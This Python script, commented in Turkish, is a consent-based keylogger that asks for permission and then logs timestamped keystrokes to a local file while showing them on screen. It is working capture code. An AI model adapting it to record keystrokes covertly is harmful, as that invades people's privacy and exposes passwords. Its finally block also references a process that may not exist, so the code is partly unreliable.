import os
import platform
import multiprocessing
import datetime
import time
from pynput import keyboard
from pynput.keyboard import Key, Listener
import colored

try:
    colored.init(autoreset=True)
except AttributeError:
    pass  # colored module might not have init method

class PermissionDeniedError(Exception):
    pass

# Klavyeden tuş basıldığında gerçekleştirilecek işlemler
def on_press(key, log_file="keylog.txt"):
    try:
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(log_file, "a") as f:
            f.write(f"{timestamp} - {str(key)}\n")
        print(colored.fg("green") + f"Key logged: {str(key)}" + colored.attr("reset"))
    except Exception as e:
        print(colored.fg("red") + f"An error occurred while writing to the file: {e}" + colored.attr("reset"))

# Kullanıcıdan izin isteme işlemi
def request_permission():
    print("\n--- Permission ---")
    while True:
        permission = input("Do you grant permission to record your keystrokes? (yes/no): ").lower()

        if permission == "yes":
            print("Keystrokes will be recorded and saved.")
            break
        elif permission == "no":
            print("Keylogging process aborted.")
            raise PermissionDeniedError("User denied permission.")
        else:
            print("Invalid input. Please enter 'yes' or 'no'.")

# Kayıt dosyasının saklanacağı konumu al
def get_save_location():
    print("\n--- Save Location ---")
    while True:
        choice = input("Do you want to save the log file in the same directory as the script? (yes/no): ").lower()
        if choice == "yes":
            return os.getcwd()
        elif choice == "no":
            return input("Enter the directory where you want to save the log file: ").strip()
        else:
            print("Invalid input. Please enter 'yes' or 'no'.")

# Geçerli bir dosya adı al
def get_valid_file_name(directory):
    print("\n--- Log File Name ---")
    while True:
        file_name = input("Enter the name of the log file (press Enter for default 'keylog.txt'): ").strip() or "keylog.txt"
        full_path = os.path.join(directory, file_name)

        if file_name:
            # Check if the file name is valid and the file does not exist
            if all(c.isalnum() or c in ['.', '_', '-'] for c in file_name) and not os.path.exists(full_path):
                return full_path
            else:
                print("Invalid characters in the file name or the file already exists. Please use only alphanumeric, '.', '_', or '-' characters and choose a unique file name.")
        else:
            print("File name cannot be empty.")

# Keylogger'ı başlat
def run_keylogger(log_file_path):
    print(f"Keylogger process ID (PID): {os.getpid()}")
    print("Press Ctrl+C to terminate the keylogger.")

    with Listener(on_press=lambda key: on_press(key, log_file=log_file_path)) as listener:
        listener.join()

# Kayıt istatistiklerini izle
def log_statistics(log_file_path):
    print("\n--- Logging Statistics ---")

    while not os.path.exists(log_file_path):
        time.sleep(1)  # Log file creation check

    try:
        while True:
            time.sleep(10)  # Print statistics every 10 seconds
            with open(log_file_path, "r") as f:
                log_content = f.read()
                num_keystrokes = len(log_content)
                num_lines = log_content.count('\n')
                print(f"Total keystrokes: {num_keystrokes}, Lines in log file: {num_lines}")
    except KeyboardInterrupt:
        pass

if __name__ == "__main__":
    try:
        request_permission()
        directory = get_save_location()
        log_file_path = get_valid_file_name(directory)

        process_keylogger = multiprocessing.Process(target=run_keylogger, args=(log_file_path,), daemon=True)
        process_statistics = multiprocessing.Process(target=log_statistics, args=(log_file_path,), daemon=True)

        process_keylogger.start()
        process_statistics.start()

        print(colored.fg("yellow") + "Keylogger and logging statistics processes started." + colored.attr("reset"))
        print(f"To kill the keylogger process, use the command: kill -15 {process_keylogger.pid}")
        print("Press Ctrl+C to terminate the logging statistics process.")

        process_keylogger.join()

    except PermissionDeniedError as e:
        print(colored.fg("red") + f"\n{e}" + colored.attr("reset"))
    except KeyboardInterrupt:
        print(colored.fg("red") + "\nKeylogging process terminated." + colored.attr("reset"))
    except Exception as e:
        print(colored.fg("red") + f"An unexpected error occurred: {e}" + colored.attr("reset"))
    finally:
        process_statistics.terminate()
        process_statistics.join()
        print("Logging statistics process terminated.")
        print("\nThank you for using the keylogger script!")
